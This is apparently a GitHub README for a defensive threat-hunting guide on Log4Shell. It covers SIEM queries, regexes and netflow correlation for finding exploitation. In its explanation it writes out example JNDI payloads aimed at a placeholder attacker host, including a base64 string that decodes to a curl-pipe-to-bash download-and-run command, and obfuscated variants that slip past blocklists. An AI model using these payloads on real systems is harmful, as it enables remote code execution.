# log4shell-hunting

As the log4j "sawdust" settles, many Organizations may want to take further proactive steps to hunt for current or prior abuse of cve-2021-44228 in their environment.

This resource takes a threat hunting approach not to only replace identification of attempted attacks on the network; a role that is ideally primarily fulfilled by existing security products, but instead takes advantage of the"noisy" nature of the attack to systematically hunt for successful outcomes of the attempted attacks against vulnerable assets across an environment.

## Device Executing Log4j Attack instructions
Hunt Methodology: Hypothesis Driven <br>
Efficacy: High<br>
Data Domain: NetFlow | Web<br>
Data Requirements
1. You have access to various web and app server logs
2. You have the capability to look at netflow logs from at least December 10th 0500 UTC
3. Web logs need to contain request headers, input fields, and query/body parameters to be comprehensive

## Operational Intelligence for Hypothesis Driven Hunt
How the attack works - string payload is placed in headers, input field,s or query and body parameters. Software running Log4j processes event or a log of the event containing the string and executes as directed by lookup feature provided by the vulnerable `jndilookup.class`. This Java Naming Directory Interface is the API that allows Java Apps to perform searches for objects in their names. located in the Java Archive file for the particular running Log4j instance.

This string is sent as input from a client and can be logged (kind of part of the attack) in several places and times. This makes the entier nature of the attack a very "noisy" one. Logging records of the attack also provide us investigators and hunters with a record of what the adversary attempted to do.

Lets look at an example:
`${jndi:ldap://caffeinatedsheep.com/a}`

1. The attacker passes this string to the server for logging.
2. Log4j interpolates the string and, as instructed, queries the a record of the attacker controlled ldap server.
3. The ldap server responds with the directory info which is a malicious java class, command, shell, etc. Base64 can also be passed which can be decoded and executed.
4. Java downloads or executes the response/command.

Here is an example using base64:
`${jndi:ldap://caffeinatedsheep.com:12344/Basic/Command/Base64/KGN1cmwgLXMgY2FmZmVpbmF0ZWRzaGVlcC5jb206NTg3NCl8YmFzaA==}`

## The Hunt: Network Resource
1. **Scoping out a Query**: Scope all relevant logs using the `${jndi\:` string. Create an output that you can run additional analysis on.
2. **Scope Reduction**: Filter results to those that contain protocol resolutions; exclude the base64 command events which will be hunted separately.
2. **Threat Extraction**: Extract indicators to use for successful attack identification. <br>
regular expression: `\/\/(?<threat>(?<threat_host>(?:[[:alnum:]]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[[:alnum:]]|\.){1,})))`
4. **Successful Attack Identification**: Run the exported list against a comprehensive record of netflow data during attack timeline.
4. **Analyze Results**: Review the results and contain, remediate, and escalate where necessary.  

## The Hunt: Base64 Command Execution
1. **Scoping out a Query**: Scope all relevant logs using the `${jndi\:` string. Create an output that you can run additional analysis on.
2. **Scope Reduction**: Filter results to those that contain base64 command events.
2. **Threat Extraction**: Extract indicators to use for successful attack identification. <br>
regular expression: `\/Base64\/(?<base64_threat>[A-Za-z\d+\/]*(?:==|=|[A-Za-z\d+\/]))[|}]`
3. **Base64 Decoding**: Using built in tools, or tools like `base64 -d` in linux or CyberChef, decode the base 64 to get the commands that were executed.
4. **Network Threat Extraction**: Extract the network indicators to run against your netflow data.
4. **Successful Attack Identification**: Run the exported list against a comprehensive record of netflow data during attack timeline. Additionally, run the execution commands against endpoint data.
4. **Analyze Results**: Review the results and contain, remediate, and escalate where necessary.  

*Note: You may find this regex doesn't work well for your logs. There are more efficient ways to match; however, this regex was written to be able to match against many disparate logs. There were many variations of the regex, but this was sufficient for hunts in several environments and was able to capture all relevant events in those cases. I am open to PRs with additional / alternative regex.*

### Scoping out a Query
Scope all relevant logs using the `${jndi\:` string.

While searches could be written to specifically look for the strings of interest, if you are typing the command manually, or have the clock cycles to spend, I recommend considering a simple match statement such as the following.

SPL:
```field_of_interest IN (${jndi:ldap://*,${jndi:dns//*,${jndi:rmi://*,${jndi:corbal://*,${jndi:http://*,${jndi:iiop://*,${jndi:nis://*)``` <br>


KQL:
```field_of_interest : ${jndi:ldap://* or field_of_interest:${jndi:dns://* or field_of_interest:${jndi:rmi://* or field_of_interest:${jndi:corbal://*  or field_of_interest:${jndi:http://*  or field_of_interest:${jndi:iiop://*  or field_of_interest:${jndi:nis://* ```

**simple search, but expensive:** <br>
KQL example: `user-agent : ${jndi\:*` <br>
SPL example: `user-agent = ${jndi:*`

*Note: Know your data. Some logs may not have nicely formatted fields user-agent, headers, authorization fields, etc. For example, in Apache Tomcat logs, the data we are looking for will be found somewhere in the messages field. Therefore it is best to use a wildcard before and after our string.*

KQL example:`message : *${jndi\:*`<br>
SPL example:`message = *${jndi:*`

*Note: The above searches while less efficient than only wildcard'ing the end of the string, but they may be more effective at finding ever instance of the attack.*



### The string blacklist bypasses problem
A bypass to popular mitigation is to blocklist some of the affected lookup strings. A simple method around this is to use upper or lower notations.

For example, the following may be logged:
```
${jndi:${lower:l}${lower:d}a${lower:p}://caffeinatedsheep.com/a}
${jndi:${lower:d}${lower:n}s://caffeinatedsheep.com/a}

normalized to

${jndi:ldap://caffeinatedsheep.com/a
${jndi:dns://caffeinatedsheep.com/a
```

There are other atmthods as well such as pulling in null values like imporper dates or this string which calls null environment variables before each letter.

```
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//caffeinatedsheep.com/a}

normalized to

${jndi::ldap://caffeinatedsheep.com/a}
```

Therefore our search must account for these bypass method.


### Locations to consider checking
- username and passwords
- email addresses
- user-agent string
- filenames
- following headers

Authorization |
Cache-Control |
Cf-Connecting_ip |
Client-Ip |
Contact |
Cookie |
Forwarded-For-Ip |
Forwarded-For |
Forwarded |
If-Modified-Since |
Originating-Ip |
Referer |
True-Client-Ip |
User-Agent |
X-Api-Version |
X-Client-Ip |
X-Forwarded-For |
X-Leakix |
X-Originating-Ip |
X-Real-Ip |
X-Remote-Addr |
X-Remote-Ip |
X-Wap-Profile |
Authorization: Basic |
Authorization: Bearer |
Authorization: Oauth  |
Authorization: Token


## To Be Continued -- work in progress

### Threat Extraction
Categorize the events based on Base64 encoding or remote network querying.

#### Network Extraction:
`\/{1,2}(?<threat>(?<threat_host>(?:[[:alnum:]]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[[:alnum:]]|\.){1,})))`

#### Base64
`\/Base64\/(?<base64_threat>[A-Za-z\d+\/]*(?:==|=|[A-Za-z\d+\/]))[|}]`

### Scope Reduction
Extract indicators to use for successful attack identification and run a list of indicators against netflow data and endpoint data.

### Analyze Results
Review the results and contain, remediate, and escalate where necessary.

## FQ&A and General Info

| CVE | Type | Affected Log4j Versions | Non-Default Configuration | Observed in Wild |
|---|---|---|---|---|
| CVE-2021-44228 | RCE | 2.0 through 2.14.1 | No | Yes |
| CVE-2021-45046 |DoS and RCE | 2.0 through 2.15.0 | Yes | No |
| CVE-2021-4104 | RCE | 1.2* | Yes | No |
| CVE-2021-45105 | DoS | 2.0-beta9 to 2.16.0 | Yes | No |

<h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/CVE-2021-44228_cvss_scoring.png" width="400px"></h1>

Why is Log4j such a big deal?
1. **Can impact not only the targeted application, but also software it forwards logs to**
2. **Provides unauthenticated Remote Code Execution**
This element alone is enough to warrant attention from security practitioners. RCE allows adversaries to instruct victim devices to execute arbitrary code.
3. **Identifying and remediating instances of the vulnerability**
While many vulnerabilities that we tackle only require defenders to implement an OS or application update, this vulnerability affects many applications and cannot be fixed at an OS level. Patching is difficult without developer instructions. Attempts to patch may be insufficient in some cases.
4. **External scans have limited visibility and accuracy**
While external scans may be able to profile much of the software and its dependencies utilized in your environment that an adversary may see, it is not able to comprehensively denote the existence of the project in your environment. Primarily, this is because it is not a primary service that will interface with application clients. Log4j is also an open source project which means any one can take the project and bake it into their own application making hashing (for agent based scanning) or application profiling difficult.
5. **The library is widely used in software and applications**
This vulnerability doe not require Java Runtime Environment to be installed at an OS level. JRE can be embedded into a standalone app. Some implementations use Log4j externally while other applications can use Log4j that is embedded in a standalone executable. There are also "Transitive dependency cases". This is where an app you use, does not directly require Log4j but a library or project your application depends on does. Applications that are affected due to the use of Elasticsearch are a good example of this.  

*Note: Multiple efforts to compile lists of affected software have been undertake to respond to this uniquely difficult to identify threat. Two such lists are: [CISA Log4j (CVE-2021-44228) Affected Vendor & Software List](https://github.com/cisagov/log4j-affected-db/blob/develop/SOFTWARE-LIST.md) and [Nationaal Cyber Security Centrum Software List](https://github.com/NCSC-NL/log4shell/blob/main/software/software_list.md)*

# Traditional Detection
As noted, security controls, particularly Intrusion Detection/Prevention Systems, Dedicated WAFs / Next-Gen or L7 Firewalls or other NTAs are particularly usefor for the detection of these attacks in a network.

## A few items to note:
#### Inbound Encrypted Sessions
While basic security efforts undertaken in most security shops apply, it should be noted that security controls which analyze network traffic to identify log4j attacks will likely not be sufficient to detect attacks in encrypted sessions.  

*Note: Some organizations may notice that L7 firewalls fail to prevent and detect attacks that internal IDS/IPS device catch, this may be due to traffic being encrypted while passing through the firewall but not encrypted will passing through the successfully detecting sensor.*

1. **Decryption** - there are various methods to decrypt inbound traffic, all require some configuration. Optimally, this can be configured at an edge L7 firewall with signatures to detect and prevent attacks against cve-2021-44228.
2. **Behind SSL Termination** - this option is applicable for organizations who may use Load Balancers to direct client requests across multiple servers or who decrypt traffic at a network device like a L7 firewall before traffic is proceeds south of the firewall.


## Additional Resources
[MUSA ŞANA](https://musana.net/2021/12/13/log4shell-Quick-Guide/)
[Oracle Documentation on jndi-lookup](https://docs.oracle.com/javase/7/docs/technotes/guides/jndi/jndi-ldap.html)
[Frequently Asked Questions About Log4Shell](https://www.tenable.com/blog/cve-2021-44228-cve-2021-45046-cve-2021-4104-frequently-asked-questions-about-log4shell)
[Picus - 4 Step Immediate Mitigation for
Log4j Attacks (Log4Shell)](https://media-exp1.licdn.com/dms/document/C4D1FAQHAbdlMIo1zVw/feedshare-document-pdf-analyzed/0/1640074174833?e=1640908800&v=beta&t=wOeCXDhR7G8ZjvLotB1olV5SU-dIsW_cvpNAQBKq3Rw)

## Vulnerability (CVE-2021-44228, log4shell)
- https://logging.apache.org/log4j/2.x/security.html
- https://issues.apache.org/jira/browse/LOG4J2-3201
- https://github.com/apache/logging-log4j2/pull/608
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
